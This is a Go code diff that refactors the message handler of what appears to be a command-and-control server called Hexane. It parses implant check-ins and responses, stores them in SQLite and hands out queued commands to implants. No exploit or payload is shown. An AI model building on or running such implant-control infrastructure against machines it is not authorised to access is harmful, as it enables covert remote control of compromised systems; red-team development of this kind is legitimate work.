@@ -9,10 +9,10 @@ import (
 // parse response, push to database then print?
 const HeaderLength = 12
 
-func ProcessBodyToParser(body []byte) (*Parser, uint32) {
+func ProcessBodyToParser(b []byte) (*Parser, uint32) {
 	var offset uint32
 
-	parser := CreateParser(body)
+	parser := CreateParser(b)
 	if parser.MsgLength < HeaderLength {
 		return nil, 0
 	}
@@ -30,40 +30,29 @@ func ProcessBodyToParser(body []byte) (*Parser, uint32) {
 	return parser, offset
 }
 
-func (h *HexaneConfig) ProcessParser(parser *Parser) ([]byte, error) {
-	var (
-		err error
-		rsp []byte
-	)
-
-	// todo: command data per config (CommandChannel)
-	switch parser.MsgType {
+func (h *HexaneConfig) ProcessParser(p *Parser) ([]byte, error) {
+	switch p.MsgType {
 	case TypeCheckin:
 
+		h.CommandChan = make(chan string, 5) // implant is checked-in
 		h.Active = true
-		h.CommandChan = make(chan string, 5) // implant is checked-in. give him a command channel
 
-		parser.ParseTable()
-		return []byte(strconv.Itoa(int(parser.PeerId))), nil
+		p.ParseTable()
+		return []byte(strconv.Itoa(int(p.PeerId))), nil
 
 	case TypeResponse:
-
-		parser.ParseTable()
+		p.ParseTable()
 		return h.DispatchCommand()
-		// process/print response data
-		// return any tasking data (if available)
+
 	case TypeTasking:
+		return h.DispatchCommand()
 
-		// process task request. print nothing
-		// return any tasking data (if available)
 	default:
-		return nil, fmt.Errorf("unknown msg type: %v", parser.MsgType)
+		return nil, fmt.Errorf("unknown msg type: %v", p.MsgType)
 	}
-
-	return rsp, nil
 }
 
-func ResponseWorker(body []byte) ([]byte, error) {
+func ResponseWorker(b []byte) ([]byte, error) {
 	var (
 		err    error
 		offset uint32
@@ -72,20 +61,20 @@ func ResponseWorker(body []byte) ([]byte, error) {
 		rsp    []byte
 	)
 
-	for len(body) > 0 {
-		if parser, offset = ProcessBodyToParser(body); parser == nil {
-			return nil, fmt.Errorf("processing message body to parser: bad parser or message length")
+	for len(b) > 0 {
+		if parser, offset = ProcessBodyToParser(b); parser == nil {
+			return nil, fmt.Errorf("processing message b to parser: bad parser or message length")
 		}
 
 		parser.PeerId = bits.ReverseBytes32(parser.ParseDword())
 		parser.TaskId = bits.ReverseBytes32(parser.ParseDword())
 		parser.MsgType = bits.ReverseBytes32(parser.ParseDword())
 
-		// peer is confirmed by PID. Probably not the safest method
 		if config = GetConfigByPeerId(parser.PeerId); config != nil {
 			if err = config.SqliteInsertParser(parser); err != nil {
 				return []byte("200 ok"), err
 			}
+
 			if rsp, err = config.ProcessParser(parser); err != nil {
 				return []byte("200 ok"), err
 			}
@@ -94,7 +83,7 @@ func ResponseWorker(body []byte) ([]byte, error) {
 			rsp = []byte("200 ok")
 		}
 
-		body = body[offset:]
+		b = b[offset:]
 	}
 
 	return rsp, err
